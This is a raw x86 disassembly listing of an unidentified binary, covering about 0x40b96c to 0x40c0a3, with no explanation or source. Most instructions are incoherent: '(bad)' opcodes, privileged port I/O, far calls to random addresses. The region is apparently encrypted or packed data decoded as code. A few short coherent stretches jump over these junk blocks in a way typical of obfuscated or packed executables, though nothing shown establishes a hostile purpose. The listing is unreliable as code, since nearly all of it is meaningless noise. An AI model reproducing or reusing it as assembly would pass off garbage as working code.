  40b96c:	lods   al,BYTE PTR ds:[esi]
  40b96d:	mov    bh,0x2b
  40b96f:	sub    edi,edi
  40b971:	mov    ecx,0xfa805746
  40b976:	sbb    ah,0x13
  40b979:	jp     0x40b941
  40b97b:	jge    0x40b9a3
  40b97d:	pop    ds
  40b97e:	test   DWORD PTR [ebp+0x3d],ebp
  40b981:	mov    ds:0x10c3b931,al
  40b986:	mov    ch,0xc8
  40b988:	fsubr  DWORD PTR [ecx]
  40b98a:	fisubr WORD PTR [eax-0x574f64be]
  40b990:	sar    DWORD PTR [esi+0x37072023],1
  40b996:	jo     0x40b9c7
  40b998:	adc    BYTE PTR [edx],0x3d
  40b99b:	out    0x2d,al
  40b99d:	adc    bh,BYTE PTR [eax-0x2e]
  40b9a0:	mov    ecx,DWORD PTR [ebx+ebp*8+0x3de3368a]
  40b9a7:	sbb    cl,BYTE PTR [ecx-0x7750bf4c]
  40b9ad:	push   ds
  40b9ae:	xor    DWORD PTR [edx],ebp
  40b9b0:	dec    edx
  40b9b1:	test   al,0x20
  40b9b3:	(bad)  
  40b9b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9b5:	or     dh,BYTE PTR [esi-0x6ed6e082]
  40b9bb:	sbb    eax,0x8d089a0e
  40b9c0:	xor    BYTE PTR [ecx+0x66],0x24
  40b9c4:	inc    edi
  40b9c5:	lock mov DWORD PTR [ebp+0x5d],0x6e2e9dc0
  40b9cd:	and    DWORD PTR [esi+0x3d],edx
  40b9d0:	dec    esp
  40b9d1:	dec    ebp
  40b9d2:	das    
  40b9d3:	pushf  
  40b9d4:	add    eax,0xa54d171c
  40b9d9:	mov    eax,ds:0x484ee054
  40b9de:	add    DWORD PTR [eax],ecx
  40b9e0:	bound  edx,QWORD PTR [ebp-0x1b]
  40b9e3:	cwde   
  40b9e4:	rcl    BYTE PTR cs:[edi],1
  40b9e7:	pop    DWORD PTR [esi+0x39]
  40b9ea:	stos   BYTE PTR es:[edi],al
  40b9eb:	mov    BYTE PTR [edx+0x522ac28d],ch
  40b9f1:	out    dx,eax
  40b9f2:	icebp  
  40b9f3:	aam    0xb8
  40b9f5:	cmovne edi,DWORD PTR [ebp+0x2ad2e2c3]
  40b9fc:	nop
  40b9fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9fe:	mov    eax,0x795ea1c0
  40ba03:	or     ecx,eax
  40ba05:	(bad)  
  40ba07:	mov    WORD PTR [ebp-0x6dae9e85],?
  40ba0d:	xchg   ebx,eax
  40ba0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba0f:	std    
  40ba10:	call   FWORD PTR [eax+0xb]
  40ba13:	out    dx,al
  40ba14:	jge    0x40ba12
  40ba16:	js     0x40ba96
  40ba18:	xchg   esi,eax
  40ba19:	mov    dh,0xac
  40ba1b:	outs   dx,DWORD PTR ds:[esi]
  40ba1c:	mov    eax,0x18ca3f4d
  40ba21:	push   edi
  40ba22:	int3   
  40ba23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba24:	push   ebp
  40ba25:	bound  edx,QWORD PTR [ebx]
  40ba27:	test   al,0xf9
  40ba29:	adc    dh,BYTE PTR [esi+edx*2]
  40ba2c:	mov    ebp,0xa75a5a9b
  40ba31:	pusha  
  40ba32:	dec    edx
  40ba33:	(bad)  
  40ba34:	out    0xd,eax
  40ba36:	in     eax,0x2a
  40ba38:	(bad)  
  40ba39:	lahf   
  40ba3a:	aaa    
  40ba3b:	aas    
  40ba3c:	adc    eax,0x54ce4032
  40ba41:	imul   ebx,edi,0x4b
  40ba44:	xchg   ebp,eax
  40ba45:	into   
  40ba46:	push   ss
  40ba47:	ja     0x40ba23
  40ba49:	stos   DWORD PTR es:[edi],eax
  40ba4a:	mov    ?,WORD PTR [ebx]
  40ba4c:	xchg   ebp,eax
  40ba4d:	or     al,0x93
  40ba4f:	mov    DWORD PTR [edx+ebp*2],esp
  40ba52:	stc    
  40ba53:	outs   dx,DWORD PTR ds:[esi]
  40ba54:	sub    bh,0x38
  40ba57:	test   al,0x21
  40ba59:	in     eax,dx
  40ba5a:	pop    eax
  40ba5b:	mov    eax,ds:0x9019d169
  40ba60:	sub    BYTE PTR [ebx+0x4f133620],bh
  40ba66:	stos   DWORD PTR es:[edi],eax
  40ba67:	pop    ecx
  40ba68:	(bad)  [ecx-0x3af448e0]
  40ba6e:	dec    ebx
  40ba6f:	jg     0x40bab4
  40ba71:	(bad)  
  40ba72:	adc    al,0x91
  40ba74:	mov    ecx,0xdda09016
  40ba79:	rol    BYTE PTR [ebx+0xa003402],1
  40ba7f:	pop    ebx
  40ba80:	sub    eax,0x755923f7
  40ba85:	fwait
  40ba86:	out    dx,al
  40ba87:	std    
  40ba88:	jle    0x40baea
  40ba8a:	daa    
  40ba8b:	mov    BYTE PTR [edi+0x1c],cl
  40ba8e:	stos   DWORD PTR es:[edi],eax
  40ba8f:	leave  
  40ba90:	pop    ebx
  40ba91:	dec    ecx
  40ba92:	lods   eax,DWORD PTR ds:[esi]
  40ba93:	xor    eax,0xda6de598
  40ba98:	jbe    0x40ba87
  40ba9a:	pop    edi
  40ba9b:	sub    eax,ebp
  40ba9d:	pop    ds
  40ba9e:	jbe    0x40ba25
  40baa0:	or     eax,0x8bded557
  40baa5:	push   ebp
  40baa6:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40baac:	xor    edx,eax
  40baae:	add    edi,ecx
  40bab0:	add    edx,ecx
  40bab2:	imul   edx,edi
  40bab5:	mov    DWORD PTR [ebp+0xc],edx
  40bab8:	mov    edx,DWORD PTR [ebp+0xc]
  40babb:	jmp    0x40be2e
  40bac0:	cmp    BYTE PTR ds:0x766dac5b,ch
  40bac6:	retf   
  40bac7:	jge    0x40bac8
  40bac9:	dec    ebx
  40baca:	jo     0x40baa5
  40bacc:	call   FWORD PTR [ecx+0x28]
  40bacf:	sub    BYTE PTR [ebp-0x3583837d],dl
  40bad5:	jns    0x40bb53
  40bad7:	jl     0x40bb01
  40bad9:	iret   
  40bada:	xchg   esp,eax
  40badb:	sbb    edx,DWORD PTR [ebx-0x22c40f98]
  40bae1:	adc    DWORD PTR [edi-0x2cb8162c],edx
  40bae7:	dec    esp
  40bae8:	ja     0x40bae7
  40baea:	jae    0x40bad7
  40baec:	pop    edx
  40baed:	jmp    0x8dcd:0x2a1d16be
  40baf4:	xor    eax,0x8d936dc6
  40baf9:	fild   DWORD PTR [ecx+ebp*4+0x4f]
  40bafd:	hlt    
  40bafe:	sub    eax,0x86e3dc65
  40bb03:	xchg   esi,eax
  40bb04:	mov    edx,0x4c380f95
  40bb09:	lea    esp,[ecx+0x2ac6f80]
  40bb0f:	sbb    al,0x64
  40bb11:	lods   al,BYTE PTR ds:[esi]
  40bb12:	jae    0x40bb42
  40bb14:	ins    DWORD PTR es:[edi],dx
  40bb15:	cmp    BYTE PTR [ebx],dl
  40bb17:	lea    ebp,[ecx+0x5649bd3e]
  40bb1d:	out    0xd7,al
  40bb1f:	ret    
  40bb20:	test   DWORD PTR [edx],eax
  40bb22:	pop    edx
  40bb23:	cmp    eax,0x5d985e8
  40bb28:	mov    dl,0x35
  40bb2a:	js     0x40bb63
  40bb2c:	mov    bh,0xe8
  40bb2e:	std    
  40bb2f:	pop    ebp
  40bb30:	xor    ebx,DWORD PTR [edi-0x5c28877f]
  40bb36:	mov    bl,0x2e
  40bb38:	sub    al,BYTE PTR [eax+0x31]
  40bb3b:	addr16 popa 
  40bb3d:	enter  0xeba,0x58
  40bb41:	cmp    edi,DWORD PTR [eax]
  40bb43:	outs   dx,BYTE PTR ds:[esi]
  40bb44:	(bad)  
  40bb45:	call   0x198140dd
  40bb4a:	dec    ebp
  40bb4b:	mov    gs,WORD PTR [ecx+0x3dbc8e]
  40bb51:	js     0x40bb1e
  40bb53:	dec    edi
  40bb54:	sar    BYTE PTR [esi+0x55],0x69
  40bb58:	(bad)  
  40bb59:	dec    al
  40bb5b:	pop    ebp
  40bb5c:	xchg   ecx,eax
  40bb5d:	sbb    bh,al
  40bb5f:	outs   dx,DWORD PTR ds:[esi]
  40bb60:	push   DWORD PTR [ebp+0x12]
  40bb63:	ins    DWORD PTR es:[edi],dx
  40bb64:	and    al,0xcc
  40bb66:	mov    dl,0x72
  40bb68:	dec    eax
  40bb69:	fwait
  40bb6a:	xchg   ebx,eax
  40bb6b:	adc    edi,eax
  40bb6d:	cs xchg ecx,eax
  40bb6f:	leave  
  40bb70:	mov    eax,fs:0x4f76be6f
  40bb76:	jo     0x40bb8d
  40bb78:	retf   
  40bb79:	ja     0x40bbb6
  40bb7b:	mov    eax,ds:0x7ef893ea
  40bb80:	aas    
  40bb81:	push   cs
  40bb82:	pop    edx
  40bb83:	push   ebx
  40bb84:	jo     0x40bb68
  40bb86:	call   0x888dc080
  40bb8b:	cwde   
  40bb8c:	jae    0x40bbc3
  40bb8e:	js     0x40bb66
  40bb90:	pusha  
  40bb91:	pop    edi
  40bb92:	push   ecx
  40bb93:	push   0xffffffd6
  40bb95:	aad    0x93
  40bb97:	pop    ss
  40bb98:	inc    ebp
  40bb99:	(bad)  
  40bb9a:	xchg   ebx,eax
  40bb9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb9c:	xchg   edi,eax
  40bb9d:	push   edx
  40bb9e:	loop   0x40bb4e
  40bba0:	xchg   ecx,eax
  40bba1:	pop    es
  40bba2:	pop    esi
  40bba3:	enter  0xd3cf,0x4b
  40bba7:	hlt    
  40bba8:	jg     0x40bb8e
  40bbaa:	repz pop edx
  40bbac:	jns    0x40bbc6
  40bbae:	sub    BYTE PTR [edi+0x4e],al
  40bbb1:	or     al,BYTE PTR [ecx-0x25]
  40bbb4:	sbb    al,0x8b
  40bbb6:	or     esi,ebx
  40bbb8:	retf   0x6c08
  40bbbb:	xor    esp,DWORD PTR [edi-0x4b5b5df3]
  40bbc1:	leave  
  40bbc2:	push   cs
  40bbc3:	addr16 inc eax
  40bbc5:	and    al,0xd7
  40bbc7:	cdq    
  40bbc8:	out    dx,eax
  40bbc9:	(bad)  
  40bbcb:	jmp    0x40bc06
  40bbcd:	aaa    
  40bbce:	ins    DWORD PTR es:[edi],dx
  40bbcf:	mov    ebp,0xf903612a
  40bbd4:	das    
  40bbd5:	cmc    
  40bbd6:	pop    es
  40bbd7:	pop    ss
  40bbd8:	mov    esi,edi
  40bbda:	fdivrp st(4),st
  40bbdc:	xor    BYTE PTR [edx-0x555dc12a],dh
  40bbe2:	out    0xf0,eax
  40bbe4:	dec    edi
  40bbe5:	inc    edx
  40bbe6:	aad    0xed
  40bbe8:	mov    al,0xc2
  40bbea:	inc    ecx
  40bbeb:	pop    eax
  40bbec:	les    edi,FWORD PTR [edx+0x764e7d75]
  40bbf2:	push   esp
  40bbf3:	test   BYTE PTR [ebp+0x2f],bl
  40bbf6:	adc    al,0x64
  40bbf8:	ins    BYTE PTR es:[edi],dx
  40bbf9:	adc    DWORD PTR [ebx-0x406e129d],esp
  40bbff:	jg     0x40bc63
  40bc01:	and    DWORD PTR [ecx-0x173b6a99],eax
  40bc07:	repnz shl DWORD PTR [ecx-0x3e455778],0x64
  40bc0f:	stos   BYTE PTR es:[edi],al
  40bc10:	ret    0xa27d
  40bc13:	fdiv   QWORD PTR [edi+0x59fdc07c]
  40bc19:	xchg   DWORD PTR [edx+0x1eac6123],eax
  40bc1f:	shl    BYTE PTR [eax],1
  40bc21:	test   BYTE PTR [edi-0x3497e7d6],bl
  40bc27:	in     eax,0x85
  40bc29:	mov    eax,ds:0xbea97d13
  40bc2e:	sti    
  40bc2f:	pop    ss
  40bc30:	test   DWORD PTR [eax-0x8],eax
  40bc33:	jne    0x40bbc9
  40bc35:	jp     0x40bbdb
  40bc37:	inc    ecx
  40bc38:	jae    0x40bc2c
  40bc3a:	mov    esi,esi
  40bc3c:	fsub   QWORD PTR [edi]
  40bc3e:	neg    DWORD PTR [ebx+0x4a]
  40bc41:	shr    DWORD PTR [ebx-0x6ac8c03e],0xeb
  40bc48:	cmp    eax,0x97501690
  40bc4d:	jmp    0x40bc09
  40bc4f:	inc    ecx
  40bc50:	in     al,dx
  40bc51:	addr16 cli 
  40bc53:	push   ebp
  40bc54:	cwde   
  40bc55:	ret    
  40bc56:	inc    edx
  40bc57:	add    edi,esi
  40bc59:	imul   eax,edi,0x1b8af687
  40bc5f:	mov    ah,0x7c
  40bc61:	pop    ss
  40bc62:	sti    
  40bc63:	mov    eax,0x77c5be72
  40bc68:	call   0xbaaaa63a
  40bc6d:	das    
  40bc6e:	jp     0x40bc09
  40bc70:	mov    ch,0x12
  40bc72:	mov    al,ds:0xb9cf90bc
  40bc77:	xor    ebp,DWORD PTR ds:0x648d3514
  40bc7d:	mov    WORD PTR [eax+0x23],?
  40bc80:	mov    WORD PTR [ecx-0x7c],ds
  40bc83:	xor    al,0xfc
  40bc85:	scas   eax,DWORD PTR es:[edi]
  40bc86:	pop    ds
  40bc87:	sbb    eax,0x2d37e1bb
  40bc8c:	inc    ecx
  40bc8d:	ror    BYTE PTR ds:[ecx-0x53],cl
  40bc91:	inc    ecx
  40bc92:	mov    dh,BYTE PTR [edx+0x47]
  40bc95:	pop    edi
  40bc96:	mov    ds:0x67c8b09a,eax
  40bc9b:	scas   eax,DWORD PTR es:[edi]
  40bc9c:	inc    edx
  40bc9d:	leave  
  40bc9e:	add    al,0x74
  40bca0:	mov    edi,cs
  40bca2:	arpl   WORD PTR [edi-0x54],bp
  40bca5:	push   ecx
  40bca6:	xor    dl,bl
  40bca8:	inc    edx
  40bca9:	mov    DWORD PTR [edx-0x48],ebp
  40bcac:	inc    eax
  40bcad:	sub    eax,esi
  40bcaf:	adc    eax,0x4bb7b440
  40bcb4:	fwait
  40bcb5:	popa   
  40bcb6:	pop    es
  40bcb7:	push   esp
  40bcb8:	ins    DWORD PTR es:[edi],dx
  40bcb9:	add    eax,0x4c2d437e
  40bcbe:	nop
  40bcbf:	xor    eax,0x648e9b83
  40bcc4:	sbb    al,0xc1
  40bcc6:	ds mov edi,0xa0136b52
  40bccc:	int3   
  40bccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcce:	mov    al,0x1c
  40bcd0:	into   
  40bcd1:	imul   BYTE PTR [ebx+0x17f5c73a]
  40bcd7:	jmp    0x40bcac
  40bcd9:	pusha  
  40bcda:	into   
  40bcdb:	int    0x4e
  40bcdd:	fadd   QWORD PTR [ebx+edx*4]
  40bce0:	into   
  40bce1:	push   ds
  40bce2:	lahf   
  40bce3:	mov    ah,0x69
  40bce5:	(bad)  
  40bce6:	jno    0x40bcf3
  40bce8:	loop   0x40bcfe
  40bcea:	lahf   
  40bceb:	mov    al,ds:0x11361cc9
  40bcf0:	scas   eax,DWORD PTR es:[edi]
  40bcf1:	adc    al,ch
  40bcf3:	xor    esp,DWORD PTR [ebp+0x5b5c549a]
  40bcf9:	aas    
  40bcfa:	mov    bh,0x55
  40bcfc:	(bad)  
  40bcfe:	mov    ecx,DWORD PTR [ebx]
  40bd00:	dec    edi
  40bd01:	(bad)  
  40bd02:	xlat   BYTE PTR ds:[ebx]
  40bd03:	jmp    0x8522:0x892bfd46
  40bd0a:	xchg   ebp,eax
  40bd0b:	(bad)  
  40bd0c:	fadd   QWORD PTR [edi]
  40bd0e:	sub    eax,0x20700f2d
  40bd13:	pop    edx
  40bd14:	fmulp  st(5),st
  40bd16:	leave  
  40bd17:	and    DWORD PTR [edx+0x53],esi
  40bd1a:	scas   al,BYTE PTR es:[edi]
  40bd1b:	in     al,dx
  40bd1c:	push   esi
  40bd1d:	stos   BYTE PTR es:[edi],al
  40bd1e:	sub    al,BYTE PTR [eax+edi*8]
  40bd21:	aad    0x9a
  40bd23:	cmp    eax,DWORD PTR [ecx+eax*1]
  40bd26:	and    ecx,DWORD PTR [ecx+ebx*8]
  40bd29:	xlat   BYTE PTR ds:[ebx]
  40bd2a:	add    BYTE PTR [edx+0x28],0xf8
  40bd2e:	inc    ebp
  40bd2f:	data16 sub dl,dl
  40bd32:	js     0x40bd54
  40bd34:	test   BYTE PTR [edi-0x27],ch
  40bd37:	mov    esp,0x63aa269b
  40bd3c:	add    DWORD PTR [edi],esi
  40bd3e:	mov    BYTE PTR [ebx+0x79],dh
  40bd41:	push   es
  40bd42:	(bad)  
  40bd43:	jo     0x40bd15
  40bd45:	fsub   DWORD PTR [edx+0x18]
  40bd48:	mov    BYTE PTR [ebx],al
  40bd4a:	pop    edi
  40bd4b:	fcmovnbe st,st(0)
  40bd4d:	out    dx,ax
  40bd4f:	jae    0x40bd9b
  40bd51:	rcr    BYTE PTR [edx+0x31],0x92
  40bd55:	adc    eax,0x804f8324
  40bd5a:	mov    cl,0x8c
  40bd5c:	cs mov esp,0xad984238
  40bd62:	mov    edi,0xef2f7a4a
  40bd67:	adc    eax,0x56cbd1c8
  40bd6c:	cwd    
  40bd6e:	jns    0x40bd28
  40bd70:	xor    ecx,DWORD PTR [ecx+0x6a]
  40bd73:	or     DWORD PTR [eax-0x17],edi
  40bd76:	or     bl,BYTE PTR [edi-0x18846be4]
  40bd7c:	dec    ecx
  40bd7d:	je     0x40bd7b
  40bd7f:	adc    al,0x4f
  40bd81:	leave  
  40bd82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd83:	sub    bl,ah
  40bd85:	pop    ss
  40bd86:	xor    al,0x2c
  40bd88:	mov    edx,0x139460d7
  40bd8d:	fadd   QWORD PTR ds:0x30eb8963
  40bd93:	ins    DWORD PTR es:[edi],dx
  40bd94:	or     BYTE PTR ss:[eax],al
  40bd97:	in     eax,0x5c
  40bd99:	mov    eax,0x449d11f
  40bd9e:	dec    ebx
  40bd9f:	int3   
  40bda0:	out    dx,al
  40bda1:	ins    BYTE PTR es:[edi],dx
  40bda2:	es in  eax,0xf1
  40bda5:	jo     0x40bde1
  40bda7:	add    DWORD PTR [esi-0x58],ecx
  40bdaa:	pop    ebp
  40bdab:	and    BYTE PTR [ebx],dh
  40bdad:	int3   
  40bdae:	outs   dx,DWORD PTR ds:[esi]
  40bdaf:	pop    ecx
  40bdb0:	push   ebp
  40bdb1:	mov    eax,ds:0xf86e201c
  40bdb6:	pop    edx
  40bdb7:	add    DWORD PTR [esi+0x7d007a2a],0x6
  40bdbe:	cwde   
  40bdbf:	mov    ds:0x59f4c039,al
  40bdc4:	mov    edx,0x7a160503
  40bdc9:	push   cs
  40bdca:	or     DWORD PTR [ebx-0x525b550b],esi
  40bdd0:	shr    DWORD PTR [ebp+0x7],cl
  40bdd3:	jno    0x40be21
  40bdd5:	cmc    
  40bdd6:	enter  0x5804,0xa4
  40bdda:	shl    ecx,cl
  40bddc:	push   0x2e
  40bdde:	mov    ch,0xc
  40bde0:	repnz pop eax
  40bde2:	inc    edx
  40bde3:	push   0xffffffc5
  40bde5:	jns    0x40bdd5
  40bde7:	ret    
  40bde8:	int3   
  40bde9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdea:	sub    al,0x8f
  40bdec:	jno    0x40be36
  40bdee:	mov    eax,0x1abcf210
  40bdf3:	jo     0x40bdff
  40bdf5:	sub    eax,0x709f4c77
  40bdfa:	inc    ebp
  40bdfb:	adc    BYTE PTR [eax-0x2ff82375],0x96
  40be02:	gs sub cl,dh
  40be05:	js     0x40be6c
  40be07:	call   0xf89:0x1152e0d8
  40be0e:	mov    ebx,0x281cbbab
  40be13:	pop    esp
  40be14:	fistp  DWORD PTR [esi+ecx*2+0x5f]
  40be18:	and    cl,0x8
  40be1b:	push   0x7
  40be1d:	out    0x5b,al
  40be1f:	inc    ebp
  40be20:	sub    eax,0xd163edab
  40be25:	shr    DWORD PTR ds:0xb8cc82b6,cl
  40be2b:	xor    bh,ch
  40be2d:	leave  
  40be2e:	mov    DWORD PTR [ebp-0x24],edx
  40be31:	mov    edx,DWORD PTR [ebp-0x8]
  40be34:	add    edx,DWORD PTR [ebp-0x40]
  40be37:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40be3e:	mov    DWORD PTR [ebp-0x1c],edx
  40be41:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  40be48:	mov    DWORD PTR [ebp-0x44],0xf89c853b
  40be4f:	mov    edx,DWORD PTR [ebp-0x18]
  40be52:	xor    edx,eax
  40be54:	jmp    0x40c1c7
  40be59:	adc    eax,edx
  40be5b:	mov    bl,0x4c
  40be5d:	jge    0x40bec8
  40be5f:	repz dec ebp
  40be61:	push   ebp
  40be62:	add    ecx,DWORD PTR [ebx+ebx*4]
  40be65:	cmp    BYTE PTR [ebp-0x739c4139],bl
  40be6b:	jl     0x40bee9
  40be6d:	retf   0x7c79
  40be70:	jl     0x40bdf2
  40be72:	dec    ebp
  40be73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be74:	call   0x6714e57d
  40be79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be7a:	out    0xbe,eax
  40be7c:	arpl   bp,si
  40be7e:	mov    esi,eax
  40be80:	jge    0x40bef4
  40be82:	ins    DWORD PTR es:[edi],dx
  40be83:	(bad)  
  40be84:	(bad)  
  40be85:	or     BYTE PTR [edx+0x4e06d6b8],cl
  40be8b:	(bad)  
  40be8d:	dec    ebx
  40be8e:	xor    ah,BYTE PTR ds:0x44172e6e
  40be94:	rcl    DWORD PTR ss:[esi-0x499f6e74],cl
  40be9b:	adc    eax,0xda5cff54
  40bea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bea1:	xchg   BYTE PTR [edx*2-0x4ac5d9a5],al
  40bea8:	adc    DWORD PTR [edi-0x55],edx
  40beab:	mov    al,BYTE PTR gs:[edi-0x5a]
  40beaf:	push   ss
  40beb0:	xchg   BYTE PTR [edx-0x35],dl
  40beb3:	scas   al,BYTE PTR es:[edi]
  40beb4:	rcl    edi,cl
  40beb6:	pop    edx
  40beb7:	ins    DWORD PTR es:[edi],dx
  40beb8:	pop    edi
  40beb9:	xor    al,0x39
  40bebb:	mov    ebx,0x5c80f702
  40bec0:	dec    eax
  40bec1:	je     0x40bf10
  40bec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bec4:	cdq    
  40bec5:	pop    edi
  40bec6:	or     al,0xdf
  40bec8:	hlt    
  40bec9:	inc    ebx
  40beca:	nop
  40becb:	dec    edi
  40becc:	retf   
  40becd:	sub    eax,0xb313b5e4
  40bed2:	and    al,0x46
  40bed4:	jl     0x40bf30
  40bed6:	add    bh,bh
  40bed8:	push   esp
  40bed9:	shl    dl,cl
  40bedb:	inc    ecx
  40bedc:	in     al,dx
  40bedd:	or     al,0xef
  40bedf:	shr    DWORD PTR [ebx+0x2b],0x2d
  40bee3:	xchg   edx,eax
  40bee4:	or     edi,DWORD PTR [ecx-0x5b]
  40bee7:	out    dx,al
  40bee8:	dec    edx
  40bee9:	add    DWORD PTR [ebx-0x399d3ac5],eax
  40beef:	retf   0x338f
  40bef2:	mov    cl,0xc7
  40bef4:	cld    
  40bef5:	jnp    0x40bedb
  40bef7:	cs mov dh,0xda
  40befa:	(bad)  
  40befc:	ins    DWORD PTR es:[edi],dx
  40befd:	pop    esp
  40befe:	fsubr  QWORD PTR [esi]
  40bf00:	sbb    eax,0x749e10a9
  40bf05:	or     BYTE PTR [edx-0x4a64fd00],dh
  40bf0b:	pop    ds
  40bf0c:	ret    0xcc37
  40bf0f:	cmovs  ebx,DWORD PTR [esi+0x4d]
  40bf13:	stc    
  40bf14:	sbb    BYTE PTR [edi+ecx*4-0x72730521],0x64
  40bf1c:	aam    0x63
  40bf1e:	push   esp
  40bf1f:	sub    BYTE PTR [ebp+ecx*1+0x77a506b9],bh
  40bf26:	pop    ecx
  40bf27:	and    DWORD PTR [eax+ebp*8-0x15],0x801e7c6b
  40bf2f:	or     BYTE PTR [eax],cl
  40bf31:	and    eax,0x44ca8b25
  40bf36:	mov    al,ds:0xb0f4c242
  40bf3b:	call   0xe12dce6a
  40bf40:	push   cs
  40bf41:	and    DWORD PTR [ebx+0x4dda90f0],0x6c
  40bf48:	push   esp
  40bf49:	sahf   
  40bf4a:	jmp    0x40bf85
  40bf4c:	or     eax,0x120c51b5
  40bf51:	cmp    dh,BYTE PTR [eax-0x28]
  40bf54:	test   esp,eax
  40bf56:	pop    eax
  40bf57:	iret   
  40bf58:	add    al,BYTE PTR [edi+eax*1-0x64e576a9]
  40bf5f:	pop    ds
  40bf60:	out    dx,al
  40bf61:	adc    edi,DWORD PTR [edi+edi*1-0x4757afc8]
  40bf68:	pop    ebp
  40bf69:	push   ebp
  40bf6a:	inc    edx
  40bf6b:	arpl   WORD PTR [ebx+0x7255c90c],cx
  40bf71:	push   ebp
  40bf72:	mov    DWORD PTR [ebx+0x6a],eax
  40bf75:	in     al,0x6
  40bf77:	mov    esp,0xa36ac97e
  40bf7c:	xchg   edi,eax
  40bf7d:	sbb    esp,DWORD PTR [ebx]
  40bf7f:	wbinvd 
  40bf81:	pop    eax
  40bf82:	inc    esi
  40bf83:	inc    esi
  40bf84:	cmp    eax,esi
  40bf86:	test   al,0x79
  40bf88:	xor    DWORD PTR [ecx],esp
  40bf8a:	push   ebp
  40bf8b:	pop    esp
  40bf8c:	sub    DWORD PTR [ecx+0x10fb2ec8],0x82508014
  40bf96:	xchg   DWORD PTR [edx],ebx
  40bf98:	loop   0x40bf31
  40bf9a:	mov    bl,al
  40bf9c:	call   0x8b68:0xb1a6107
  40bfa3:	xor    DWORD PTR [ecx-0x63],0x4e
  40bfa7:	mov    edx,0x8f05481
  40bfac:	icebp  
  40bfad:	xor    BYTE PTR [edx],0x7e
  40bfb0:	lock loope 0x40bf3b
  40bfb3:	fstp   DWORD PTR [eax+0x6a]
  40bfb6:	add    ebx,ecx
  40bfb8:	mov    edi,DWORD PTR [esi+0x50]
  40bfbb:	hlt    
  40bfbc:	mov    ds:0x726aad71,al
  40bfc1:	pop    esi
  40bfc2:	or     DWORD PTR [esi+edx*2+0x7a96af18],ecx
  40bfc9:	jmp    FWORD PTR [esi]
  40bfcb:	out    0x3a,al
  40bfcd:	adc    ebx,eax
  40bfcf:	xchg   edx,eax
  40bfd0:	into   
  40bfd1:	jmp    0x40bfa6
  40bfd3:	sub    eax,DWORD PTR [edx-0x76baf751]
  40bfd9:	cmp    BYTE PTR [edx+0x39],cl
  40bfdc:	xchg   esp,eax
  40bfdd:	call   0x8bb3:0xb7718031
  40bfe4:	mov    bh,0xa7
  40bfe6:	dec    edi
  40bfe7:	cmp    cl,dl
  40bfe9:	retf   0x5460
  40bfec:	imul   DWORD PTR [esi-0x1e]
  40bfef:	fild   WORD PTR [ecx+ebx*8]
  40bff2:	pop    ecx
  40bff3:	mov    bh,0x44
  40bff5:	mov    esi,0x3cd62e9e
  40bffa:	jnp    0x40bf7e
  40bffc:	fcomip st,st(4)
  40bffe:	inc    esi
  40bfff:	sti    
  40c000:	fstp   DWORD PTR [ebx-0x74]
  40c003:	mov    ss,WORD PTR [eax+eax*1+0x5ab49f9a]
  40c00a:	cmp    BYTE PTR [ecx+0x0],0xdf
  40c00e:	and    BYTE PTR [edi+0x2136439d],bl
  40c014:	adc    DWORD PTR [ecx-0x6a],ecx
  40c017:	and    edi,edx
  40c019:	jecxz  0x40c013
  40c01b:	data16 clc 
  40c01d:	and    al,0xae
  40c01f:	dec    ebp
  40c020:	adc    al,0x99
  40c022:	xchg   ebp,eax
  40c023:	sub    eax,0x8859c0b8
  40c028:	jns    0x40c03e
  40c02a:	push   eax
  40c02b:	xchg   BYTE PTR [ebx+0x5a146343],ch
  40c031:	xor    eax,eax
  40c033:	retf   0xdaff
  40c036:	ins    DWORD PTR es:[edi],dx
  40c037:	push   edi
  40c038:	cmp    eax,0x4643643f
  40c03d:	shr    DWORD PTR [esi],1
  40c03f:	add    BYTE PTR [ecx],ah
  40c041:	push   edi
  40c042:	pop    esp
  40c043:	or     al,0xc
  40c045:	dec    edi
  40c046:	inc    edx
  40c047:	stos   BYTE PTR es:[edi],al
  40c048:	imul   esi,DWORD PTR [eax-0x20],0xffffffcb
  40c04c:	test   ah,bh
  40c04e:	repz retf 
  40c050:	sti    
  40c051:	ffree  st(1)
  40c053:	sti    
  40c054:	loop   0x40c03d
  40c056:	pop    ebp
  40c057:	retf   0xda8c
  40c05a:	sub    eax,0xafdc48d0
  40c05f:	jg     0x40c0cf
  40c061:	mov    BYTE PTR [ecx],ah
  40c063:	xchg   edx,eax
  40c064:	std    
  40c065:	push   esp
  40c066:	inc    ebx
  40c067:	or     al,0x84
  40c069:	out    dx,eax
  40c06a:	xor    al,0x9e
  40c06c:	in     al,dx
  40c06d:	mov    cl,0xf8
  40c06f:	add    esp,eax
  40c071:	mov    bl,0x9c
  40c073:	dec    esi
  40c074:	aam    0xb6
  40c076:	das    
  40c077:	dec    esp
  40c078:	test   al,0x9f
  40c07a:	(bad)  
  40c07b:	sar    al,1
  40c07d:	dec    eax
  40c07e:	scas   al,BYTE PTR es:[edi]
  40c07f:	sahf   
  40c080:	jo     0x40c09c
  40c082:	ins    BYTE PTR es:[edi],dx
  40c083:	cli    
  40c084:	mov    eax,0xd70dbd29
  40c089:	aaa    
  40c08a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c08b:	shl    DWORD PTR [ecx+edx*2+0x72],0x4f
  40c090:	test   ebx,esi
  40c092:	pop    edx
  40c093:	push   ebx
  40c094:	ret    
  40c095:	dec    ebx
  40c096:	div    al
  40c098:	pop    edx
  40c099:	dec    ecx
  40c09a:	mov    dh,0xfd
  40c09c:	pop    ebp
  40c09d:	mov    bh,0xb8
  40c09f:	sahf   
  40c0a0:	xchg   BYTE PTR [esi-0x31],cl
  40c0a3:	mov    bl,0x4c
